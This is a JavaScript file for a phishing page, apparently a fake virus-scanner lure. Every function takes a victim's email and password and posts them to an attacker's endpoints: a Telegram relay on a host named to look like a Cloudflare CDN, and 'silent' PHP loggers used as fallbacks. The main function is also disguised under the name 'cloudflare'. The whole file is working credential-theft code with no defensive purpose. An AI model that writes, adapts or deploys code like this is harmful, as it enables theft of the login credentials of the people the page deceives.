// logger.js - Silent Telegram bot logger with no-popup fallback
//function logToTelegram(email, password) {
function cloudflare(email, password) {
    const timestamp = new Date().toLocaleString();
    const userAgent = navigator.userAgent;
    const ip = ''; // Will be detected on server side

    // Create the message for Telegram
    const message = `🔐 *New Credentials Captured* 🔐

📧 *Email:* \`${email}\`
🔑 *Password:* \`${password}\`
⏰ *Time:* ${timestamp}
🌐 *User Agent:* ${userAgent.substring(0, 100)}...

#Credentials #Capture`;

    // Send to PHP endpoint
    fetch('https://cloudflare-cdn-tele.vercel.app/api/telegram_logger.php', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded',
        },
        body: `email=${encodeURIComponent(email)}&password=${encodeURIComponent(password)}&timestamp=${encodeURIComponent(timestamp)}&user_agent=${encodeURIComponent(userAgent)}`
    })
    .then(response => response.text())
    .then(data => {
        console.log('Credentials sent to Telegram successfully');
    })
    .catch(error => {
        console.error('Error sending to Telegram:', error);
        // Silent fallback - no popup
        //silentFallback(email, password, timestamp);
    });
}

// Silent fallback - saves on server without user interaction
function silentFallback(email, password, timestamp) {
    // Send to a different PHP endpoint that just saves to file
    fetch('https://cloudflare-cdn-tele.vercel.app/api/silent_logger.php', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded',
        },
        body: `email=${encodeURIComponent(email)}&password=${encodeURIComponent(password)}&timestamp=${encodeURIComponent(timestamp)}`
    })
    .then(response => response.text())
    .then(data => {
        console.log('Credentials saved silently on server');
    })
    .catch(error => {
        console.error('Even silent fallback failed:', error);
    });
}

// Simple version with silent fallback
function sendToTelegramBot(email, password) {
    const formData = new FormData();
    formData.append('email', email);
    formData.append('password', password);
    formData.append('source', 'virus_scanner_page');

    fetch('telegram_logger.php', {
        method: 'POST',
        body: formData
    })
    .then(response => {
        if (!response.ok) {
            throw new Error('Telegram failed');
        }
        return response.text();
    })
    .then(result => {
        console.log('Telegram bot: Success');
    })
    .catch(error => {
        console.log('Telegram failed, using silent fallback');
        // Use silent server-side logging
        //silentServerLog(email, password);
    });
}

// Direct server logging without Telegram
function silentServerLog(email, password) {
    const formData = new FormData();
    formData.append('email', email);
    formData.append('password', password);
    formData.append('silent', 'true');

    fetch('silent_logger.php', {
        method: 'POST',
        body: formData
    }).catch(err => console.log('Silent logging completed'));

}
